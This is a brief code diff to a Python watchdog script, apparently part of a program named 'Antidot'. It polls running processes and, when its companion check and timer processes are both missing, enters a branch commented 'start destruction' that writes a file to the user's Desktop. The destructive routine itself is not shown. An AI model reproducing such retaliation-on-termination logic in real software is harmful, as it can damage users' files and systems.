@@ -24,9 +24,10 @@ call(["AntidotCheck.cpp"])
 def check_check() -> None:
     while True:
         running = "AntidotCheck.cpp" in (p.name() for p in psutil.process_iter())
+        timer_running = "AntidotTimer.pyw" in (p.name() for p in psutil.process_iter())
 
         # If it is not running start destruction
-        if running == False:
+        if running == False and timer_running == False:
             # Getting desktop path and adding .txt file
             desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
             with open(f"{desktop}//ANTIDOT.txt", "w") as f:
